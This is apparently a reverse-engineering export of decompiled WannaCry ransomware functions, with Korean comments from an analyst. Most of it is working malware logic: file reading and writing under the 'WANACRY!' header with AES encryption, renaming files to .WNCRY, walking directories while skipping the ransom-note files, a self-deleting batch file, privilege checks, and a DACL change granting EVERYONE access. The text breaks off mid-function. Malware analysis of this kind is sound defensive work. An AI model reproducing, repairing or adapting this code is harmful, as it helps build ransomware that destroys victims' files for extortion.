// Combined export of all functions at 20250522_182057

// --- Metadata ---
// Function Name: CwnryIO_10001000
// Address: 0x10001000
// Signature: unknown_signature
// ---------------
int __cdecl CwnryIO_10001000(void *Buffer, int a2)
{
  FILE *v2; // eax
  FILE *v3; // esi
  size_t v4; // eax

  if ( a2 )
    v2 = fopen("c.wnry", "rb");
  else
    v2 = fopen("c.wnry", "wb");
  v3 = v2;
  if ( !v2 )
    return 0;
  if ( a2 )
    v4 = fread(Buffer, 0x30Cu, 1u, v2);
  else
    v4 = fwrite(Buffer, 0x30Cu, 1u, v2);
  if ( !v4 )
  {
    fclose(v3);
    return 0;
  }
  fclose(v3);
  return 1;
}


// --- Metadata ---
// Function Name: RunProcessWithTimeout_10001080
// Address: 0x10001080
// Signature: unknown_signature
// ---------------
int __cdecl RunProcessWithTimeout_10001080(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+8h] [ebp-54h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+18h] [ebp-44h] BYREF

  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  ProcessInformation.hProcess = 0;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  if ( dwMilliseconds )                         // 커맨드라인으로 새 프로세스를 생성 
  {
    if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
      TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
    if ( lpExitCode )
      GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
  }
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return 1;
}


// --- Metadata ---
// Function Name: CreateAndRunTempBatchFile_10001140
// Address: 0x10001140
// Signature: unknown_signature
// ---------------
FILE *__cdecl CreateAndRunTempBatchFile_10001140(const char *a1)
{
  unsigned int v1; // eax
  int v2; // eax
  FILE *result; // eax
  FILE *v4; // esi
  __time32_t v5; // [esp-4h] [ebp-10Ch]
  char Buffer[260]; // [esp+4h] [ebp-104h] BYREF

  v1 = GetTickCount();
  srand(v1);
  v5 = time(0);
  v2 = rand();
  sprintf(Buffer, "%d%d.bat", v2, v5);          // 임시 .bat 파일을 생성, 실행 후 삭제 
  result = fopen(Buffer, "wt");
  v4 = result;
  if ( result )
  {
    fprintf(result, "%s\ndel /a %%0\n", a1);
    fclose(v4);
    result = (FILE *)RunProcessWithTimeout_10001080(Buffer, 0, 0);
  }
  return result;
}


// --- Metadata ---
// Function Name: GetCurrentUserSID_100011D0
// Address: 0x100011D0
// Signature: unknown_signature
// ---------------
int __cdecl GetCurrentUserSID_100011D0(wchar_t *sidStringBuffer)
{
  HANDLE v1; // eax
  int result; // eax
  _DWORD *v3; // esi
  DWORD TokenInformationLength; // [esp+8h] [ebp-Ch] BYREF
  HANDLE TokenHandle; // [esp+Ch] [ebp-8h] BYREF
  wchar_t *sidString; // [esp+10h] [ebp-4h] BYREF

  TokenInformationLength = 0;
  v1 = GetCurrentProcess();
  result = OpenProcessToken(v1, 8u, &TokenHandle);// 사용자 SID를 버퍼에 저장 
  if ( result )
  {
    if ( GetTokenInformation(TokenHandle, TokenUser, 0, TokenInformationLength, &TokenInformationLength)
      || GetLastError() == 122 )
    {
      v3 = GlobalAlloc(0x40u, TokenInformationLength);
      result = GetTokenInformation(TokenHandle, TokenUser, v3, TokenInformationLength, &TokenInformationLength);
      if ( result )
      {
        result = (int)LoadLibraryA("advapi32.dll");
        if ( result )
        {
          result = (int)GetProcAddress((HMODULE)result, "ConvertSidToStringSidW");
          if ( result )
          {
            sidString = 0;
            result = ((int (__stdcall *)(_DWORD, wchar_t **))result)(*v3, &sidString);
            if ( result )
            {
              wcscpy(sidStringBuffer, sidString);
              if ( v3 )
                GlobalFree(v3);
              result = 1;
            }
          }
        }
      }
    }
    else
    {
      result = 0;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: IsRunningAsSystem_100012D0
// Address: 0x100012D0
// Signature: unknown_signature
// ---------------
BOOL IsRunningAsSystem_100012D0()
{
  int v0; // eax
  DWORD pcbBuffer; // [esp+4h] [ebp-25Ch] BYREF
  WCHAR Buffer; // [esp+8h] [ebp-258h] BYREF
  char v4[596]; // [esp+Ah] [ebp-256h] BYREF
  __int16 v5; // [esp+25Eh] [ebp-2h]

  Buffer = word_1000D918;
  memset(v4, 0, sizeof(v4));
  v5 = 0;
  if ( GetCurrentUserSID_100011D0(&Buffer) )    // 현재 프로세스가 시스템 권한으로 실행되는지 확인 
  {
    v0 = wcsicmp(L"S-1-5-18", &Buffer);         // SID 문자열 비교 
  }
  else
  {
    pcbBuffer = 300;
    GetUserNameW(&Buffer, &pcbBuffer);          // 사용자 이름을 얻어 SYSTEM과 비교 
    v0 = wcsicmp(&Buffer, L"SYSTEM");
  }
  return v0 == 0;
}


// --- Metadata ---
// Function Name: IsCurrentProcessAdmin_10001360
// Address: 0x10001360
// Signature: unknown_signature
// ---------------
BOOL IsCurrentProcessAdmin_10001360()
{
  BOOL result; // eax
  BOOL IsMember; // [esp+4h] [ebp-10h] BYREF
  PSID pSid; // [esp+8h] [ebp-Ch] BYREF
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+Ch] [ebp-8h] BYREF

  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 5;
  IsMember = 0;
  result = AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 0x20u, 0x220u, 0, 0, 0, 0, 0, 0, &pSid);
  if ( result )                                 // 현재 프로세스가 관리자 권한으로 실행중인지 확인 
  {
    if ( !CheckTokenMembership(0, pSid, &IsMember) )
      IsMember = 0;
    FreeSid(pSid);
    result = IsMember;
  }
  return result;
}


// --- Metadata ---
// Function Name: GrantAccessToEveryone_100013E0
// Address: 0x100013E0
// Signature: unknown_signature
// ---------------
HLOCAL __cdecl GrantAccessToEveryone_100013E0(HANDLE handle)
{
  PACL ppDacl; // [esp+Ch] [ebp-2Ch] BYREF
  PACL NewAcl; // [esp+10h] [ebp-28h] BYREF
  PSECURITY_DESCRIPTOR ppSecurityDescriptor; // [esp+14h] [ebp-24h] BYREF
  struct _EXPLICIT_ACCESS_A pListOfExplicitEntries; // [esp+18h] [ebp-20h] BYREF

  ppDacl = 0;                                   //  주어진 HANDLE 객체의 보안 DACL를 수정하여 모든 사용자("EVERYONE")에게 접근 권한을 부여
  NewAcl = 0;
  ppSecurityDescriptor = 0;
  GetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, &ppDacl, 0, &ppSecurityDescriptor);
  pListOfExplicitEntries.grfAccessPermissions = 2031617;
  pListOfExplicitEntries.grfAccessMode = GRANT_ACCESS;
  pListOfExplicitEntries.grfInheritance = 0;
  pListOfExplicitEntries.Trustee.pMultipleTrustee = 0;
  pListOfExplicitEntries.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
  pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
  pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
  pListOfExplicitEntries.Trustee.ptstrName = "EVERYONE";
  SetEntriesInAclA(1u, &pListOfExplicitEntries, ppDacl, &NewAcl);
  SetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, NewAcl, 0);
  LocalFree(ppDacl);
  LocalFree(NewAcl);
  return LocalFree(ppSecurityDescriptor);
}


// --- Metadata ---
// Function Name: GenerateRandomString_100014A0
// Address: 0x100014A0
// Signature: unknown_signature
// ---------------
int __cdecl GenerateRandomString_100014A0(int a1)
{
  unsigned int v1; // esi
  size_t v2; // edi
  WCHAR *v3; // ebx
  unsigned __int16 v4; // cx
  int v5; // edi
  int i; // esi
  int j; // edi
  DWORD nSize; // [esp+10h] [ebp-194h] BYREF
  WCHAR Buffer; // [esp+14h] [ebp-190h] BYREF
  char v11[396]; // [esp+16h] [ebp-18Eh] BYREF
  __int16 v12; // [esp+1A2h] [ebp-2h]

  Buffer = word_1000D918;
  memset(v11, 0, sizeof(v11));
  nSize = 399;
  v12 = 0;
  GetComputerNameW(&Buffer, &nSize);            // 컴퓨터 이름을 기반으로 시드를 설정해 임의 문자열 생성 
  v1 = 1;
  v2 = 0;
  if ( wcslen(&Buffer) )
  {
    v3 = &Buffer;
    do
    {
      v4 = *v3++;
      v1 *= v4;
      ++v2;
    }
    while ( v2 < wcslen(&Buffer) );
  }
  srand(v1);
  v5 = rand() % 8 + 8;
  for ( i = 0; i < v5; ++i )
    *(_BYTE *)(i + a1) = rand() % 26 + 97;
  for ( j = v5 + 3; i < j; ++i )
    *(_BYTE *)(i + a1) = rand() % 10 + 48;
  *(_BYTE *)(i + a1) = 0;
  return a1;
}


// --- Metadata ---
// Function Name: initMainObject_10001590
// Address: 0x10001590
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall initMainObject_10001590(_DWORD *mainObject)
{
  _DWORD *linkedListNode; // eax
  char v4; // [esp+Bh] [ebp-11h]

  initObject_10003A10((char *)mainObject + 4);  // 내부 객체의 생성자이자 초기 상태 세팅 함수 
  initObject_10003A10((char *)mainObject + 44);
  initVTableFuncPtr_10005D80((_BYTE *)mainObject + 84);
  mainObject[306] = 0;
  mainObject[307] = 0;
  mainObject[308] = 0;
  mainObject[309] = 0;
  *((_BYTE *)mainObject + 1248) = v4;
  linkedListNode = operator new(0x18u);
  *linkedListNode = linkedListNode;
  linkedListNode[1] = linkedListNode;
  mainObject[313] = linkedListNode;
  mainObject[314] = 0;
  mainObject[310] = 0;
  *((_WORD *)mainObject + 642) = 0;
  *((_WORD *)mainObject + 902) = 0;
  mainObject[581] = 0;
  mainObject[311] = 0;
  mainObject[582] = 0;
  mainObject[583] = 0;
  mainObject[584] = 0;
  *mainObject = &off_100071F8;
  return mainObject;
}


// --- Metadata ---
// Function Name: sub_10001660
// Address: 0x10001660
// Signature: unknown_signature
// ---------------
void *__thiscall sub_10001660(void *this, char a2)
{
  CryptoObject_Destructor_10001680((char *)this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: CryptoObject_Destructor_10001680
// Address: 0x10001680
// Signature: unknown_signature
// ---------------
void __thiscall CryptoObject_Destructor_10001680(char *this)
{
  _DWORD **v2; // ebp
  _DWORD *i; // ebx
  _DWORD **v4; // esi

  *(_DWORD *)this = &off_100071F8;              // 복합 객체의 소멸자 
  CleanupCryptoObject_10001760(this);
  v2 = (_DWORD **)*((_DWORD *)this + 313);
  for ( i = *v2; i != v2; --*((_DWORD *)this + 314) )
  {
    v4 = (_DWORD **)i;
    i = (_DWORD *)*i;
    *v4[1] = *v4;
    (*v4)[1] = v4[1];
    std::wstring::_Tidy(v4 + 2, 1);
    operator delete(v4);
  }
  operator delete(*((void **)this + 313));
  *((_DWORD *)this + 313) = 0;
  *((_DWORD *)this + 314) = 0;
  DestroyCryptoObject_10005DB0(this + 84);
  DeleteCriticalSection_10003A60(this + 44);
  DeleteCriticalSection_10003A60(this + 4);
}


// --- Metadata ---
// Function Name: CleanupCryptoObject_10001760
// Address: 0x10001760
// Signature: unknown_signature
// ---------------
int __thiscall CleanupCryptoObject_10001760(int this)
{
  _BYTE *v2; // eax
  int v3; // ecx
  _BYTE *v4; // eax
  int v5; // ecx
  void *v6; // eax
  const WCHAR *v7; // esi

  ReleaseCryptoResources_10003BB0((_DWORD *)(this + 4));
  ReleaseCryptoResources_10003BB0((_DWORD *)(this + 44));
  v2 = *(_BYTE **)(this + 1224);
  if ( v2 )                                     // 암호화 관련 작업이 포함된 객체의 소멸자 
  {
    v3 = 0x100000;
    do
    {
      *v2++ = 0;
      --v3;
    }
    while ( v3 );
    GlobalFree(*(HGLOBAL *)(this + 1224));
    *(_DWORD *)(this + 1224) = 0;
  }
  v4 = *(_BYTE **)(this + 1228);
  if ( v4 )
  {
    v5 = 0x100000;
    do
    {
      *v4++ = 0;
      --v5;
    }
    while ( v5 );
    GlobalFree(*(HGLOBAL *)(this + 1228));
    *(_DWORD *)(this + 1228) = 0;
  }
  v6 = *(void **)(this + 1240);
  if ( v6 )
  {
    *(_DWORD *)(this + 1244) = 1;
    WaitForSingleObject(v6, 0xFFFFFFFF);
    dword_1000D934(*(_DWORD *)(this + 1240));
    *(_DWORD *)(this + 1240) = 0;
  }
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 1260));
  v7 = (const WCHAR *)(this + 1804);
  if ( wcslen(v7) )
    DeleteFileW_0(v7);
  return 1;
}


// --- Metadata ---
// Function Name: initCryptoSession_10001830
// Address: 0x10001830
// Signature: unknown_signature
// ---------------
int __thiscall initCryptoSession_10001830(LPVOID pSession, LPCSTR keyFilePath, int a3, int a4)
{
  int result; // eax
  unsigned int v6; // eax

  result = SetupCryptoSessionKey_10003AC0((_DWORD *)pSession + 1, keyFilePath, 0);// 키 1 
  if ( result )
  {
    if ( keyFilePath )
      SetupCryptoSessionKey_10003AC0((_DWORD *)pSession + 11, 0, 0);// 키 2 
    result = (int)GlobalAlloc(0, 0x100000u);    // 1mb 버퍼 2개 할당 
    *((_DWORD *)pSession + 306) = result;
    if ( result )
    {
      result = (int)GlobalAlloc(0, 0x100000u);  // 더블 버퍼링 구조 = 파일 I/O, 네트워크, 암복호화 등에 사용 
      *((_DWORD *)pSession + 307) = result;
      if ( result )
      {
        InitializeCriticalSection((LPCRITICAL_SECTION)((char *)pSession + 1260));
        *((_DWORD *)pSession + 310) = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, pSession, 0, 0);
        *((_DWORD *)pSession + 309) = a3;
        *((_DWORD *)pSession + 308) = a4;
        v6 = GetTickCount();
        srand(v6);
        result = 1;
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: storeTwoValues_100018F0
// Address: 0x100018F0
// Signature: unknown_signature
// ---------------
int __thiscall storeTwoValues_100018F0(_DWORD *this, int a2, int a3)
{
  int result; // eax

  result = a2;                                  // 단순 멤버 변수 저장 
  this[583] = a2;
  this[582] = a3;
  return result;
}


// --- Metadata ---
// Function Name: generateEncryptFilePath_10001910
// Address: 0x10001910
// Signature: unknown_signature
// ---------------
int __thiscall generateEncryptFilePath_10001910(wchar_t *mainObject, wchar_t *Source)
{
  wchar_t *v2; // esi
  const wchar_t *outputDir; // edi
  int fileIndex; // eax

  v2 = mainObject;
  outputDir = mainObject + 642;
  wcscpy(mainObject + 642, Source);
  fileIndex = *((_DWORD *)v2 + 581);
  v2 += 902;
  *((_DWORD *)v2 + 130) = fileIndex + 1;        // "디렉토리\번호.WNCRYT" 형식의 문자열을 생성해 저장 
  return swprintf(v2, (const size_t)L"%s\\%d%s", outputDir, fileIndex, L".WNCRYT");
}


// --- Metadata ---
// Function Name: EncryptFile_10001960
// Address: 0x10001960
// Signature: unknown_signature
// ---------------
BOOL __thiscall EncryptFile_10001960(int this, int a2, wchar_t *Format, int a4)
{
  DWORD v5; // edi AES 암호화 WANACRY! 헤더 
  HANDLE v6; // esi
  HANDLE v8; // esi
  HANDLE v9; // edi
  unsigned int v10; // eax
  _DWORD *v11; // eax
  unsigned int v12; // esi
  BOOL v13; // esi
  void (__stdcall *v14)(int, wchar_t *, LONG, DWORD, int, int); // ebx
  unsigned int v15; // [esp+1Ch] [ebp-754h] BYREF
  char v16[512]; // [esp+20h] [ebp-750h] BYREF
  _DWORD v17[128]; // [esp+220h] [ebp-550h] BYREF
  HANDLE hFile; // [esp+420h] [ebp-350h]
  int v19; // [esp+424h] [ebp-34Ch]
  DWORD v20; // [esp+428h] [ebp-348h] BYREF
  unsigned int v21; // [esp+42Ch] [ebp-344h] BYREF
  int v22; // [esp+430h] [ebp-340h]
  struct _FILETIME CreationTime; // [esp+434h] [ebp-33Ch] BYREF
  struct _FILETIME LastAccessTime; // [esp+43Ch] [ebp-334h] BYREF
  struct _FILETIME LastWriteTime; // [esp+444h] [ebp-32Ch] BYREF
  char v26[5]; // [esp+44Ch] [ebp-324h] BYREF
  __int16 v27; // [esp+451h] [ebp-31Fh]
  char v28; // [esp+453h] [ebp-31Dh]
  LARGE_INTEGER FileSize; // [esp+454h] [ebp-31Ch] BYREF
  int v30; // [esp+45Ch] [ebp-314h]
  BYTE pbBuffer[16]; // [esp+460h] [ebp-310h] BYREF
  int v32; // [esp+470h] [ebp-300h]
  LARGE_INTEGER v33; // [esp+474h] [ebp-2FCh]
  unsigned int v34; // [esp+47Ch] [ebp-2F4h] BYREF
  int v35; // [esp+480h] [ebp-2F0h] BYREF
  wchar_t Buffer; // [esp+484h] [ebp-2ECh] BYREF
  char v37[716]; // [esp+486h] [ebp-2EAh] BYREF
  __int16 v38; // [esp+752h] [ebp-1Eh]
  BOOL v39; // [esp+754h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+758h] [ebp-18h] BYREF

  Buffer = word_1000D918;
  memset(v37, 0, sizeof(v37));
  v38 = 0;
  hFile = (HANDLE)-1;
  v22 = -1;
  v5 = 0x80000000;
  v32 = this + 4;
  v20 = 0;
  v26[0] = 0;
  *(_DWORD *)&v26[1] = 0;
  v27 = 0;
  v28 = 0;
  v21 = 0;
  v30 = 0;
  v34 = 0;
  v35 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( a4 == 3 )
  {
    v5 = -1073741824;
    v19 = -1073741824;
  }
  v6 = CreateFileW_0((LPCWSTR)a2, v5, 3u, 0, 3u, 0, 0);
  hFile = v6;
  if ( v6 == (HANDLE)-1 )
  {
    if ( !return0_10003000() )
    {
LABEL_61:
      local_unwind2(&ms_exc.registration, -1);
      return 0;
    }
    v6 = CreateFileW_0((LPCWSTR)a2, v5, 3u, 0, 3u, 0, 0);
    hFile = v6;
    if ( v6 == (HANDLE)-1 )
    {
      local_unwind2(&ms_exc.registration, -1);
      return 0;
    }
  }
  if ( !GetFileSizeEx(v6, &FileSize) )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  GetFileTime(v6, &CreationTime, &LastAccessTime, &LastWriteTime);// 헤더 확인 
  if ( ReadFile_0(v6, v26, 8u, &v34, 0)
    && !memcmp(v26, "WANACRY!", 8u)
    && ReadFile_0(hFile, &v15, 4u, &v34, 0)
    && v15 <= 0x200
    && v15 == 256
    && ReadFile_0(hFile, v16, 0x100u, &v34, 0)
    && ReadFile_0(hFile, &v21, 4u, &v34, 0)
    && v21 >= a4 )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 1;
  }
  v8 = hFile;
  SetFilePointer(hFile, 0, 0, 0);
  if ( a4 == 4 )
  {
    swprintf(&Buffer, (const size_t)L"%s%s", Format, L"T");
    v9 = CreateFileW_0(&Buffer, 0x40000000u, 0, 0, 2u, 0x80u, 0);
    v22 = (int)v9;
    if ( v9 == (HANDLE)-1 )
    {
      v9 = CreateFileW_0(&Buffer, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
      v22 = (int)v9;
      if ( v9 == (HANDLE)-1 )
        goto LABEL_61;
    }
    if ( v21 == 3 )
      FileSize.QuadPart -= 0x10000i64;
  }
  else
  {
    if ( !ReadFile_0(v8, *(LPVOID *)(this + 1224), 0x10000u, &v34, 0) )
      goto LABEL_61;
    if ( v34 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0, 0, 2u);
    if ( !WriteFile_0(v8, *(LPCVOID *)(this + 1224), 0x10000u, (LPDWORD)&v35, 0) )
      goto LABEL_61;
    if ( v35 != 0x10000 )
      goto LABEL_61;
    memset(*(void **)(this + 1224), 0, 0x10000u);
    SetFilePointer(v8, 0, 0, 0);
    if ( !WriteFile_0(v8, *(LPCVOID *)(this + 1224), 0x10000u, (LPDWORD)&v35, 0) || v35 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0, 0, 0);
    v9 = v8;
    v22 = (int)v8;
  }
  if ( a4 == 4 && FileSize.HighPart <= 0 && FileSize.LowPart < 0xC800000 )
  {
    if ( *(_DWORD *)(this + 2328) )
    {
      if ( !((unsigned int)rand() % *(_DWORD *)(this + 2328)) )
      {
        v10 = *(_DWORD *)(this + 2336);
        if ( v10 < *(_DWORD *)(this + 2332) )
        {
          v30 = 1;
          v32 = this + 44;
          *(_DWORD *)(this + 2336) = v10 + 1;
        }
      }
    }
  }
  v20 = 512;
  if ( !GenerateAndEncryptRandomData_10004370(v32, pbBuffer, 0x10u, (int)v17, (int)&v20) )
    goto LABEL_61;
  InitializeAESContext_10005DC0(this + 84, (int)pbBuffer, (int)off_1000D8D4, 16, 16);
  memset(pbBuffer, 0, sizeof(pbBuffer));
  if ( !WriteFile_0(v9, "WANACRY!", 8u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &v20, 4u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, v17, v20, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &a4, 4u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &FileSize, 8u, (LPDWORD)&v35, 0) )
  {
    goto LABEL_61;
  }
  if ( a4 == 4 )
  {
    v33 = FileSize;
    if ( v21 != 3 )
      goto LABEL_52;
    SetFilePointer(v8, -65536, 0, 2u);
    if ( !ReadFile_0(v8, *(LPVOID *)(this + 1224), 0x10000u, &v34, 0) )
      goto LABEL_61;
    if ( v34 != 0x10000 )
      goto LABEL_61;
    AESEncryptWithMode_10006940(this + 84, *(_DWORD *)(this + 1224), *(char **)(this + 1228), 0x10000u, 1);
    if ( !WriteFile_0(v9, *(LPCVOID *)(this + 1228), 0x10000u, (LPDWORD)&v35, 0) || v35 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0x10000, 0, 0);
    v33.QuadPart -= 0x10000i64;
LABEL_52:
    while ( v33.QuadPart > 0 )
    {
      v11 = *(_DWORD **)(this + 1232);
      if ( (!v11 || !*v11) && ReadFile_0(hFile, *(LPVOID *)(this + 1224), 0x100000u, &v34, 0) && v34 )
      {
        v33.QuadPart -= v34;
        v12 = 16 * (((v34 - 1) >> 4) + 1);
        if ( v12 > v34 )
          memset((void *)(v34 + *(_DWORD *)(this + 1224)), 0, v12 - v34);
        AESEncryptWithMode_10006940(this + 84, *(_DWORD *)(this + 1224), *(char **)(this + 1228), v12, 1);
        if ( WriteFile_0((HANDLE)v22, *(LPCVOID *)(this + 1228), v12, (LPDWORD)&v35, 0) )
        {
          if ( v35 == v12 )
            continue;
        }
      }
      goto LABEL_61;
    }
    v8 = hFile;
    v9 = (HANDLE)v22;
  }
  SetFileTime(v9, &CreationTime, &LastAccessTime, &LastWriteTime);
  if ( a4 == 4 )
  {
    dword_1000D934(v8);
    dword_1000D934(v9);
    v22 = -1;
    hFile = (HANDLE)-1;
    v13 = MoveFileW(&Buffer, Format);
    v39 = v13;
    if ( v13 )
      SetFileAttributesW(Format, 0x80u);
    else
      DeleteFileW_0(&Buffer);
  }
  else
  {
    dword_1000D934(v8);
    v22 = -1;
    hFile = (HANDLE)-1;
    v13 = MoveFileW((LPCWSTR)a2, Format);
    v39 = v13;
  }
  if ( v13 )
  {
    v14 = *(void (__stdcall **)(int, wchar_t *, LONG, DWORD, int, int))(this + 1236);
    if ( v14 )
      v14(a2, Format, FileSize.HighPart, FileSize.LowPart, a4, v30);
  }
  local_unwind2(&ms_exc.registration, -1);
  return v13;
}


// --- Metadata ---
// Function Name: encryptFilesAndExt_10002200
// Address: 0x10002200
// Signature: unknown_signature
// ---------------
int __thiscall encryptFilesAndExt_10002200(void *this, wchar_t *Source, int a3)
{
  wchar_t *v3; // edi
  wchar_t *v4; // eax
  wchar_t *v5; // esi
  int v6; // eax
  int result; // eax
  wchar_t *v8; // [esp-8h] [ebp-2ECh]
  wchar_t Destination[360]; // [esp+14h] [ebp-2D0h] BYREF

  if ( a3 != 4 )                                // 파일 확장자 조작 → 존재 확인·암호화 시도 → 원본 파일 로깅/삭제 
  {
    v3 = Source;
    swprintf(Destination, (const size_t)L"%s%s", Source, L".WNCYR");
    goto LABEL_8;
  }
  v3 = Source;
  wcscpy(Destination, Source);
  v4 = wcsrchr(Destination, 0x2Eu);
  v5 = v4;
  if ( !v4 )
  {
    v8 = Destination;
    goto LABEL_6;
  }
  v6 = wcsicmp(v4, L".WNCYR");
  v8 = v5;
  if ( v6 )
  {
LABEL_6:
    wcscat(v8, L".WNCRY");
    goto LABEL_8;
  }
  wcscpy(v5, L".WNCRY");
LABEL_8:
  if ( GetFileAttributesW(Destination) != -1 || EncryptFile_10001960((int)this, (int)v3, Destination, a3) )
  {
    if ( a3 == 4 )
      LogAndWipeFile_10002BA0((int)this, v3);
    result = 1;
  }
  else
  {
    DeleteFileW_0(Destination);
    result = 0;
  }
  return result;
}


// --- Metadata ---
// Function Name: encryptFilesInDirectory_10002300
// Address: 0x10002300
// Signature: unknown_signature
// ---------------
int __thiscall encryptFilesInDirectory_10002300(_DWORD *this, wchar_t *Format, int a3, int a4, int a5)
{
  _DWORD *v6; // eax 폴더 내 파일과 하위 폴더 탐색 후 조건에 따라 암호화 시도 및 실패한 파일은 별도 리스트에 보관 
  HANDLE v7; // edi
  int result; // eax
  _DWORD *v9; // eax
  size_t v10; // eax
  int v11; // eax
  wchar_t *i; // edi
  int v13; // edi
  wchar_t *v14; // esi
  wchar_t v15; // ax
  wchar_t *j; // ecx
  _DWORD *v17; // eax
  _DWORD *v18; // esi
  int v19; // edi
  wchar_t *v20; // eax
  _DWORD *v21; // edi
  _DWORD *v22; // esi
  void *v23; // eax
  wchar_t *v24; // edi
  wchar_t *v25; // esi
  wchar_t *v26; // eax
  wchar_t *v27; // [esp-8h] [ebp-A68h]
  char v28; // [esp+13h] [ebp-A4Dh]
  int v29; // [esp+14h] [ebp-A4Ch] BYREF
  void *v30; // [esp+18h] [ebp-A48h]
  int v31; // [esp+1Ch] [ebp-A44h]
  int v32; // [esp+20h] [ebp-A40h] BYREF
  void *v33; // [esp+24h] [ebp-A3Ch]
  int v34; // [esp+28h] [ebp-A38h]
  int v35; // [esp+2Ch] [ebp-A34h] BYREF
  int v36; // [esp+30h] [ebp-A30h] BYREF
  HANDLE hFindFile; // [esp+34h] [ebp-A2Ch]
  BOOL v38; // [esp+38h] [ebp-A28h]
  char v39[16]; // [esp+3Ch] [ebp-A24h] BYREF
  char v40[4]; // [esp+4Ch] [ebp-A14h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+50h] [ebp-A10h] BYREF
  wchar_t Buffer[360]; // [esp+2A0h] [ebp-7C0h] BYREF
  wchar_t v43; // [esp+570h] [ebp-4F0h] BYREF
  char v44[718]; // [esp+572h] [ebp-4EEh] BYREF
  wchar_t Destination[260]; // [esp+840h] [ebp-220h] BYREF
  DWORD v46; // [esp+A48h] [ebp-18h]
  DWORD v47; // [esp+A4Ch] [ebp-14h]
  int v48; // [esp+A50h] [ebp-10h]
  int v49; // [esp+A5Ch] [ebp-4h]

  v35 = (int)this;
  LOBYTE(v32) = v28;
  v6 = operator new(0x4ECu);
  *v6 = v6;
  v6[1] = v6;
  v33 = v6;
  v34 = 0;
  LOBYTE(v29) = v28;
  v49 = 1;
  v30 = CreateLinkedNode_10003730(0, 0);        // 연결 리스트 초기화 
  v31 = 0;
  swprintf(Buffer, (const size_t)L"%s\\*", Format);
  v7 = FindFirstFileW(Buffer, &FindFileData);
  hFindFile = v7;
  if ( v7 == (HANDLE)-1 )
  {
    LOBYTE(v49) = 0;
    DeleteNodeRangeDeep_100036A0(&v29, (int)&v35, *(void **)v30, (int)v30);
    operator delete(v30);
    v30 = 0;
    v31 = 0;
    v27 = *(wchar_t **)v33;
    v49 = -1;
    DeleteNodeRangeShallow_100037C0(&v32, (int)&v35, v27, (int)v33);
    operator delete(v33);
    result = 0;
  }
  else
  {
    v38 = TestDirectoryWritable_10002F70(Format);// 폴더 쓰기 검사 
    do
    {
      v9 = (_DWORD *)this[308];
      if ( v9 && *v9 )
        break;
      if ( wcscmp(FindFileData.cFileName, L".") && wcscmp(FindFileData.cFileName, L"..") )
      {
        swprintf(Buffer, (const size_t)L"%s\\%s", Format, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( !IsCriticalSystemFolder_100032C0(Buffer, FindFileData.cFileName) )
          {
            v39[0] = v28;
            std::wstring::_Tidy(v39, 0);
            v10 = wcslen(Buffer);
            std::wstring::assign(v39, Buffer, v10);
            LOBYTE(v49) = 2;
            InsertNewWStringNode_100035C0(&v29, v40, v30, (int)v39);
            LOBYTE(v49) = 1;
            std::wstring::_Tidy(v39, 1);
          }
        }
        else if ( v38 )
        {
          if ( wcscmp(FindFileData.cFileName, L"@Please_Read_Me@.txt") )
          {
            if ( wcscmp(FindFileData.cFileName, L"@WanaDecryptor@.exe.lnk") )
            {
              if ( wcscmp(FindFileData.cFileName, L"@WanaDecryptor@.bmp") )
              {
                v43 = 0;
                memset(v44, 0, 0x4E0u);
                HIWORD(v48) = 0;
                v11 = GetFileExtensionType_10002D60(FindFileData.cFileName);
                v48 = v11;
                if ( v11 != 6
                  && v11 != 1
                  && (v11 || FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow >= 0xC800000) )
                {
                  wcsncpy(Destination, FindFileData.cFileName, 0x103u);
                  wcsncpy(&v43, Buffer, 0x167u);
                  v47 = FindFileData.nFileSizeHigh;
